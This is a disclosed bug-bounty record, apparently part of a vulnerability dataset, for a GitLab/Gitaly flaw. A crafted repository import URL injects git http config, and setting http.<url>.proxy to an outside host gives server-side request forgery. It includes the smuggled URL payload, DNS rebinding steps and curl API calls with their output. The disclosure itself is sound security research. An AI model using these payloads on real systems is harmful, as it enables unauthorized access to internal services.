{
  "reported_to": "GitLab",
  "reported_by": "vakzz ",
  "title": "Injection of `http.<url>.*` git config settings leading to SSRF",
  "content": "\nSummary\nWhen import a repo with credentials via a URL, gitaly generates the git clone command with a -c flag to add the Authorization header:\nhttps://gitlab.com/gitlab-org/gitaly/-/blob/master/internal/service/repository/create_from_url.go#L37\nCode 118 Bytes\n1flags = append(flags, git.ValueFlag{Name: \"-c\", Value: fmt.Sprintf(\"http.%s.extraHeader=%s\", u.String(), authHeader)})\nWhich will create a command such as:\nCode 168 Bytes\n1git clone --bare -c http.followRedirects=false -c 'http.http://example.com/repo.git.extraHeader=Authorization: Basic YWE6YmI=' -- http://example.com/repo.git /repo/path\nThe issue is that the url can contain one of the http config values from https://git-scm.com/docs/git-config#Documentation/git-config.txt-httplturlgt, which will result the user supplied config being set instead of extraHeader (with the .extraHeader.. being appended to the value).\nThis allows an attacker to set things like http.proxy which can result in a SSRF if they use an import url such as http://user@google.com/.proxy=http://proxy.aw.rs:8500\nSteps to reproduce\nCreate a dns entry with a short TTL\nStart a server listening on the port that you want to hit with the SSRF that always returns 200 OK, something like proxy.py (F797777)\nsudo cat /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config\n[core]\n    repositoryformatversion = 0\n    filemode = true\n    bare = true\n[http]\n    followredirects = false\n[http \"http://google.com/\"]\n    proxy = http://proxy.aw.rs:8500.extraHeader=Authorization: Basic dXNlcg==\nUpdate the dns entry to point to 127.0.0.1 and wait for it to propergate\nAdd a new mirror to the project using the same host but with the path for the SSRF (it will go through the proxy), append a ? to make sure the appended paths are removed: curl -H \"Authorization: Bearer $TOKEN\" -v -XPUT 'http://gitlab-vm.local/api/v4/projects/204?mirror=true&import_url=http://google.com/v1/config?'\ncurl -H \"Authorization: Bearer $TOKEN\" -v 'http://gitlab-vm.local/api/v4/projects/204' | jq .import_error`\n\"2:Fetching remote upstream failed: remote: method GET not allowed\\nfatal: unable to access 'http://google.com/v1/config?/': The requested URL returned error: 405\\n\"\n```\nGit (via curl) allows for socks4 and socks5 proxies as well which could potentially be used to generated other SSRF payloads for things like redis or for leaking internal dns resolutions. There maybe other http.* configs that could be exploited, an interesting one is http.cookieFile but due to the appended .extraHeader= the path is not really controllable from my initial testing.\nImpact\nAn attacker can set the http.<url>.proxy git config resulting in SSRF\nWhat is the current bug behavior?\nThe git http config propertied can be influenced by the import url\nWhat is the expected correct behavior?\nOnly the extraHeader config should be set via the git clone.\nOutput of checks\nResults of GitLab environment info\nCode 853 Bytes\n1System information\n2System:\t\tUbuntu 18.04\n3Proxy:\t\tno\n4Current User:\tgit\n5Using RVM:\tno\n6Ruby Version:\t2.6.5p114\n7Gem Version:\t2.7.10\n8Bundler Version:1.17.3\n9Rake Version:\t12.3.3\n10Redis Version:\t5.0.7\n11Git Version:\t2.24.2\n12Sidekiq Version:5.2.7\n13Go Version:\tunknown\n14\n15GitLab information\n16Version:\t12.9.4-ee\n17Revision:\t6a1a8e88568\n18Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n19DB Adapter:\tPostgreSQL\n20DB Version:\t10.12\n21URL:\t\thttp://gitlab-vm.local\n22HTTP Clone URL:\thttp://gitlab-vm.local/some-group/some-project.git\n23SSH Clone URL:\tgit@gitlab-vm.local:some-group/some-project.git\n24Elasticsearch:\tno\n25Geo:\t\tno\n26Using LDAP:\tno\n27Using Omniauth:\tyes\n28Omniauth Providers:\n29\n30GitLab Shell\n31Version:\t12.0.0\n32Repository storage paths:\n33- default: \t/var/opt/gitlab/git-data/repositories\n34GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n35Git:\t\t/opt/gitlab/embedded/bin/git\nImpact\nAn attacker can set the http.<url>.proxy git config resulting in SSRF\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 3000,
  "weaknesses": [
    "Server-Side Request Forgery (SSRF)"
  ],
  "screenshots": {},
  "disclosed_date": 1599587160,
  "report_url": "https://hackerone.com/reports/855276",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Set up a DNS entry with a short TTL pointing to a controlled server that returns 200 OK responses"
    ],
    [
      2,
      "Configure a GitLab project import with a specially crafted URL containing proxy settings (e.g., http://user@google.com/.proxy=http://proxy.aw.rs:8500)"
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to inject git configuration settings via a specially crafted URL during repository import, leading to Server-Side Request Forgery (SSRF) by manipulating the http.<url>.proxy setting. This occurs because the URL can contain git config values that get improperly parsed and set during the clone operation.",
  "reason": "The attack requires understanding of both git configuration mechanics and HTTP protocol manipulation, along with the specific way Gitaly processes import URLs. The interaction between URL parsing and git config setting is non-obvious and requires precise timing with DNS changes.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}